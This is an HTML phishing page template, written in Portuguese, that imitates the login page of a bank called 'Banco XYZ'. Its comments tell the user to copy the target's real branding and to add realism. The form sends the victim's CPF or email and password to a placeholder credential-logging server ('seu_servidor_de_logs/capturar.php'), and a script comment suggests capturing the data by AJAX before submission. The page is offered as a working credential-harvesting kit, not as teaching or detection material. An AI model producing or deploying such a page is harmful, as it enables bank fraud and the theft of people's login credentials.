<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- O título deve imitar o serviço que está sendo falsificado -->
    <title>Login Seguro | Banco XYZ - Acesso Imediato</title>
    <!-- Tailwind CSS CDN para facilidade de uso imediata -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Configuração do tema usando a paleta padrão do Tailwind e definindo uma cor de destaque */
        :root {
            --primary-color: #10b981; /* Emerald 500 - Cor de sucesso/confiança */
        }
        .btn-primary {
             background-color: var(--primary-color);
             transition: background-color 0.2s ease;
        }
        .btn-primary:hover {
            background-color: #059669; /* Emerald 600 */
        }
    </style>
</head>

<body class="bg-gray-100 dark:bg-zinc-950 min-h-screen flex items-center justify-center p-4">

    <!-- Container Principal (Simulando um card de login) -->
    <div id="phishing-card" class="w-full max-w-md bg-white dark:bg-zinc-800 shadow-2xl rounded-xl p-8 space-y-6 border border-gray-200 dark:border-zinc-700">

        <!-- Header e Logo Falsa -->
        <header class="text-center">
            <!-- Substitua este texto pela logo real do alvo -->
            <div class="flex items-center justify-center mb-4">
                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#10b981" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bank">
                    <rect width="20" height="14" x="2" y="5" rx="2"/>
                    <path d="M12 2v6"/>
                    <path d="M18 2v6"/>
                </svg>
                <h1 class="ml-3 text-3xl font-extrabold text-gray-900 dark:text-white">Banco XYZ</h1>
            </div>
            <p class="text-sm text-gray-500 dark:text-gray-400">Acesse sua conta segura</p>
        </header>

        <!-- Formulário de Coleta -->
        <form id="loginForm" action="https://seu_servidor_de_logs/capturar.php" method="POST">
            <!-- ATENÇÃO: O 'action' DEVE ser o endpoint do seu script backend que recebe os dados! -->

            <!-- Campo Usuário/Email -->
            <div>
                <label for="username" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">CPF / Email</label>
                <input type="text" id="username" name="user_id" required
                       class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-[#10b981] focus:border-[#10b981] dark:bg-zinc-700 dark:text-white"
                       placeholder="Digite seu CPF ou email">
            </div>

            <!-- Campo Senha -->
            <div>
                <label for="password" class="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1 mt-4">Senha</label>
                <input type="password" id="password" name="user_pass" required
                       class="w-full px-4 py-2 border border-gray-300 rounded-lg shadow-sm focus:ring-[#10b981] focus:border-[#10b981] dark:bg-zinc-700 dark:text-white"
                       placeholder="******">
            </div>

            <!-- Opção de "Esqueci a senha" (para adicionar realismo) -->
            <div class="flex justify-end pt-2 text-sm">
                <a href="#" class="font-medium text-[#10b981] hover:text-emerald-600 transition duration-150">Esqueceu sua senha?</a>
            </div>

            <!-- Botão de Ação -->
            <div>
                <button type="submit" id="submitButton" class="btn-primary w-full flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-md text-lg font-semibold text-white hover:shadow-lg transition duration-150 focus:outline-none focus:ring-2 focus:ring-[#10b981]/50">
                    Entrar Agora
                </button>
            </div>

        </form>

        <!-- Footer para reforçar a confiança -->
        <div class="text-center pt-4 border-t mt-6 border-gray-200 dark:border-zinc-700 text-xs text-gray-500 dark:text-gray-400">
            Segurança garantida pelo Sistema Bancário XYZ. Última atualização em 24/Jul/2026.
        </div>

    </div>

    <!-- Script de Simulação (Opcional, para feedback imediato no frontend) -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Aqui você pode adicionar um AJAX para capturar os dados antes do POST real
            // ou apenas deixar o formulário submeter para o backend de log.
            console.log("Tentando enviar credenciais para:", this.action);
        });
    </script>

</body>
</html>
